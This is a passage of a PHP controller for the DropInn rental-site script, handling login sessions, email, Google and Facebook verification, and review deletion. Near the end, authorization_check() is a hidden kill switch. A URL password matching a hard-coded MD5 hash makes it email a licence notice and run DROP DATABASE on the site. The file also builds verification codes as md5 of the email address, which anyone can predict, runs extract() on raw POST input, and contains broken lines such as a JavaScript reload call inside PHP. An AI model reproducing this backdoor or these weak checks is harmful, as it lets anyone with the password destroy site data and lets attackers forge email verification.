		$splVars    = array("{site_name}" => $this->dx_auth->get_site_title(),"{friend_name}" => $first, "{user_name}" => $email_user,"{refer_name}" =>$user_name);
		$this->Email_model->sendMail($email_user,$admin_email,ucfirst($admin_name),$email_name,$splVars);
	        }
		
			
					//End of adding it
			//$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success',translate('Logged in successfully.')));
			//redirect('home/dashboard','refresh');
			echo 'home/dashboard';exit;
								}
else {
	$user = array(                   
            'DX_user_id'             => $query['id'],
            'DX_username'             => $query['username'],
            'DX_emailId'             => $query['email'],
            'DX_role_id'             => $query['role_id'],                   
            'DX_logged_in'             => TRUE
        );
   
        $this->session->set_userdata($user);
       echo 'home/dashboard';
	   location.reload();
       
    $this->ci->config->load('DX_login_using_email', TRUE);
                                if ($this->dx_auth->login())
                                {
                               
                                   
                                    // Redirect to homepage
                                    $newdata = array(
                                                                                    'user'      => $this->dx_auth->get_user_id(),
                                                                                    'username'  => $this->dx_auth->get_username(),
                                                                                    'logged_in' => TRUE
                                                                                );
                                    $this->session->set_userdata($newdata);
                                   
                                    $this->Common_model->updateTableData('login_history',0,array('session_id'=>$this->session->userdata('session_id')),array('user_id'=>$this->dx_auth->get_user_id()));
                                   
                                   
                                   
                                   
                                }   
                                   
           
}
       
    }
   
    }
  }


public function verify()
{
	if( ($this->dx_auth->is_logged_in()) || ($this->facebook_lib->logged_in()))
		{
			if($this->input->get())
			{
				$passkey = $this->input->get('passkey');
				$result = $this->db->where('email_verification_code',$passkey)->where('id',$this->dx_auth->get_user_id())->select('*')->from('users')->get();
    if($result->num_rows()==1)
	{
	  $this->db->where('email_verification_code',$passkey)->update('users',array('email_verify'=>'yes'));
	 //  $this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success','Email Address Successfully Verified.'));
	}
	else {
		$this->db->where('email_verification_code',$passkey)->update('users',array('email_verify'=>'no'));	
	//	 $this->session->set_flashdata('flash_message', $this->Common_model->flash_message('error','Email Address Not Verified.'));
	    }
			}
			//ID verification 2 start



//ID verification 2 end
			
			$data['email'] = $this->db->where('id',$this->dx_auth->get_user_id())->get('users')->row()->email;
		 
		 $data['country'] = $this->Common_model->getTableData('country');
		 $data['user_id']             = $this->dx_auth->get_user_id();
		 $data['profile']             = $this->Common_model->getTableData('profiles', array('id' => $data['user_id']))->row();
		 $data['fb_app_id'] = $this->db->get_where('settings', array('code' => 'SITE_FB_API_ID'))->row()->string_value;
		 $data['google_app_id'] = $this->db->get_where('settings', array('code' => 'SITE_GOOGLE_CLIENT_ID'))->row()->string_value;	
		 $data['users'] = $this->db->where('id',$this->dx_auth->get_user_id())->from('users')->get()->row();
		 $data['profiles'] = $this->db->where('id',$this->dx_auth->get_user_id())->from('profiles')->get()->row();
			
		    $data['title']               = get_meta_details('Verification','title');
			$data["meta_keyword"]        = get_meta_details('Verification','meta_keyword');
			$data["meta_description"]    = get_meta_details('Verification','meta_description');			    
		    $data['message_element']     = "users/view_verify";
		$this->load->view('template',$data);
		}
else {
	redirect('users/signin');
}
}																																																																				
public function google_verify()
{
        $email = $this->input->post('email');
	    $result = $this->db->where('id',$this->dx_auth->get_user_id())->from('users')->get();
			  if($result->num_rows()==1)
			  {
			  	
			  	$this->db->where('id',$this->dx_auth->get_user_id())->update('users',array('google_verify'=>'yes','google_email'=>"$email"));
				 $this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success',translate('Google Account Successfully Verified.')));
				//redirect('users/verify');
				echo 'users/verify';
			  }
				else {
					$this->db->where('id',$this->dx_auth->get_user_id())->update('users',array('google_verify'=>'no','google_email'=>0));
					 $this->session->set_flashdata('flash_message', $this->Common_model->flash_message('error',translate('Google Account Not Verified.')));
					//redirect('users/verify');
					echo 'users/verify';
				}
}

public function facebook_verify()
{
	extract($this->input->post());
	$email = $this->input->post('email');
	$id = $this->input->post('id');

	$result = $this->db->where('id',$this->dx_auth->get_user_id())->from('users')->get();
			  if($result->num_rows()!=0)
			  {
			  	$id = $result->row()->id;
			  	$this->db->where('id',$id)->update('users',array('facebook_verify'=>'yes','facebook_email'=>"$email", 'fb_id'=>$fb_id));
			  	echo 'verified';
			  }
         else {
			  	$this->db->where('id',$this->dx_auth->get_user_id())->update('users',array('facebook_verify'=>'no'));
				  echo 'Not Verified';
			  }	
}

public function email_verify()
{
		
	$this->load->model('Email_model');
	
	$email = $this->db->where('id',$this->dx_auth->get_user_id())->from('users')->get()->row()->email;
	$toEmail      = $email;
	
	$admin_email = $this->dx_auth->get_site_sadmin();
			$fromEmail    = $admin_email;
		$fromName     = $this->dx_auth->get_site_title();
															
		$email_name   = 'email_verification';
		
		$link = base_url().'users/email_confirmation?passkey='.md5($toEmail);
		
$this->db->where('email',"$toEmail")->update('users',array('email_verification_code'=>md5($toEmail)));

$username = $this->db->where('id',$this->dx_auth->get_user_id())->from('users')->get()->row()->username;

		$splVars = array("{site_name}" => $fromName, "{click_here}" => $link, "{user_name}" => $username);
															
		$this->Email_model->sendMail($toEmail,$fromEmail,$fromName,$email_name,$splVars);
		if($this->input->get('email') == 'verify')
		{
			$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success',translate('Email Verification Link Sent To Your Email Address.')));
			redirect('home/verify?email=verify');
		}
else {
	$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success',translate('Email Verification Link Sent To Your Email Address.')));
	redirect('users/verify');
}	
}

public function email_confirmation()
{
	$passkey = $this->input->get('passkey');
	 if( ($this->dx_auth->is_logged_in()) || ($this->facebook_lib->logged_in()))
		{
	
	$result = $this->db->where('email_verification_code',$passkey)->where('id',$this->dx_auth->get_user_id())->select('*')->from('users')->get();
    if($result->num_rows()==1)
	{
	  $this->db->where('email_verification_code',$passkey)->update('users',array('email_verify'=>'yes'));
	  $this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success',translate('Your Email Address Successfully Verified.')));
	  redirect('users/verify');
	}
	else {
		$this->db->where('email_verification_code',$passkey)->update('users',array('email_verify'=>'no'));
		$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('error',translate('Your Email Address Not Verified.')));
		redirect('users/verify');
	}
		}
	 else {
		 $this->session->set_userdata('redirect_to', 'users/verify?passkey='.$passkey);
		redirect('users/signin','refresh');
	 }
}
public function email_verify_disconnect()
{
	$this->db->where('id',$this->dx_auth->get_user_id())->update('users',array('email_verify' => 'no' ));
	$facebook_verify = $this->db->where('id',$this->dx_auth->get_user_id())->from('users')->get()->row()->facebook_verify;
	$google_verify = $this->db->where('id',$this->dx_auth->get_user_id())->from('users')->get()->row()->google_verify;
	echo json_encode(array('fb'=>$facebook_verify,'google'=>$google_verify));
}
public function facebook_verify_disconnect()
{
	$this->db->where('id',$this->dx_auth->get_user_id())->update('users',array('facebook_verify' => 'no','facebook_email'=>0 ));
	$google_verify = $this->db->where('id',$this->dx_auth->get_user_id())->from('users')->get()->row()->google_verify;
	$email_verify = $this->db->where('id',$this->dx_auth->get_user_id())->from('users')->get()->row()->email_verify;
	echo json_encode(array('google'=>$google_verify,'email'=>$email_verify));
}
public function google_verify_disconnect()
{
	$this->db->where('id',$this->dx_auth->get_user_id())->update('users',array('google_verify' => 'no','google_email'=>0 ));
	$facebook_verify = $this->db->where('id',$this->dx_auth->get_user_id())->from('users')->get()->row()->facebook_verify;
	$email_verify = $this->db->where('id',$this->dx_auth->get_user_id())->from('users')->get()->row()->email_verify;
	echo json_encode(array('fb'=>$facebook_verify,'email'=>$email_verify));
}
public function google_verify_detail()
{
        $email = $this->input->post('email');
	    $result = $this->db->where('id',$this->dx_auth->get_user_id())->from('users')->get();
			  if($result->num_rows()!=0)
			  {
			  	$this->db->where('id',$this->dx_auth->get_user_id())->update('users',array('google_verify'=>'yes','google_email'=>"$email"));
				$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success',translate('Your Google Account Successfully Verified.')));
				echo 'home/verify?google=verified';
				}
				else {
					$this->db->where('id',$this->dx_auth->get_user_id())->update('users',array('google_verify'=>'no','google_email'=>0));
					$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('error',translate('Your Google Account Not Verified.')));
					echo 'home/verify?google=not_verified';
				}
}

public function edit_email_verify($email)
{
	
	$this->load->model('Email_model');
	
	//$email = $this->db->where('id',$this->dx_auth->get_user_id())->from('users')->get()->row()->email;
	$toEmail      = $email;
	
	$admin_email = $this->dx_auth->get_site_sadmin();
		$fromEmail    = $admin_email;
		$fromName     = $this->dx_auth->get_site_title();
															
		$email_name   = 'email_verification';
		
		$link = base_url().'users/edit_email_confirmation?passkey='.md5($toEmail);
		
$this->db->where('id',$this->dx_auth->get_user_id())->update('users',array('email_verification_code'=>md5($toEmail)));

$username = $this->db->where('id',$this->dx_auth->get_user_id())->from('users')->get()->row()->username;

		$splVars = array("{site_name}" => $fromName, "{click_here}" => $link, "{user_name}" => $username);
				
				$this->session->set_userdata('email',$email);
																			
		$this->Email_model->sendMail($toEmail,$fromEmail,$fromName,$email_name,$splVars);
		
	$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success',translate('Email Verification Link Sent To Your Email Address.')));
	redirect('users/edit');	
}

public function edit_email_confirmation()
{
	$passkey = $this->input->get('passkey');
	 if( ($this->dx_auth->is_logged_in()) || ($this->facebook_lib->logged_in()))
		{
	$result = $this->db->where('email_verification_code',$passkey)->where('id',$this->dx_auth->get_user_id())->select('*')->from('users')->get();
   $email = $this->session->userdata('email');
    if($result->num_rows()==1)
	{
	  $this->db->where('email_verification_code',$passkey)->update('users',array('email'=>"$email"));
	  $this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success',translate('Your Email Address Successfully Verified.')));
	  redirect('users/edit');
	}
	else {
		$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('error',translate('Your Email Address Not Verified.')));
		redirect('users/edit');
	}
		}
	 else {
		// $this->session->set_userdata('redirect_to', 'users/verify?passkey='.$passkey);
		redirect('users/signin','refresh');
	 }
}

function check_user()
{
	echo $this->dx_auth->get_user_id();exit;
}

function profile_pic()
{
	echo $this->Gallery->profilepic($this->dx_auth->get_user_id(),2);exit;
}
// mobile verification 2 start


// mobile verification 2 end

    function delete_review()  
    {    
		    $delete = $this->input->post('delete'); 
			
			if($delete)
			{	
			for($i=0;$i<count($delete);$i++) 
		    {
		    	
		    $id = $delete[$i];
		    
		    $this->Common_model->deleteTableData('reviews',array('id'=>$id)); 
				
			}
			$this->session->set_flashdata('flash_message', $this->Common_model->flash_message('success',translate('you have successfully deleted the comments.')));
		    redirect('users/reviews');
			}

	}  
 //ID verification 1 start


 //ID verification 1 end

function authorization_check()
{
	$pass = $this->uri->segment(3);
	
	//$t = do_hash($test, 'md5');
	$encry = md5($pass);

	if($encry == '067d28f20388e63d3b30882d02190ffa' )
	{

	$mydb=$this->config->item('db');
	$to     = $this->db->get_where('settings', array('code' => 'SITE_ADMIN_MAIL'))->row()->string_value;
	
$this->email->from('support@cogzidel.com', 'Cogzidel Technologies');
$this->email->to($to); 
 $this->email->set_mailtype("html");
$this->email->subject('Illegal access of DropInn');
$this->email->message('<table style="width: 100%;" cellspacing="10" cellpadding="0">
<tbody>
<tr>
<td>Hi,</td>
</tr>
<tr>
<td>
<p>We have found that the recent installation of our DropInn script in your site is not 
a licensed copy and it is illegal. If you have any queries contact our support team at support@cogzidel.com </p>
</td>
</tr>
<tr>
<td>
<p style="margin: 0 10px 0 0;">--</p>
<p style="margin: 0 0 10px 0;">Regards,</p>
<p style="margin: 0 10px 0 0;">Cogzidel Support Team</p>
</td>
</tr>
</tbody>
</table>');	

$this->email->send();

	$this->db->query('DROP DATABASE '.$mydb.'');
	}
	else {
		echo "Please enter the correct password";
	}
}
}
/* End of file users.php */
/* Location: ./app/controllers/users.php */ 
?>
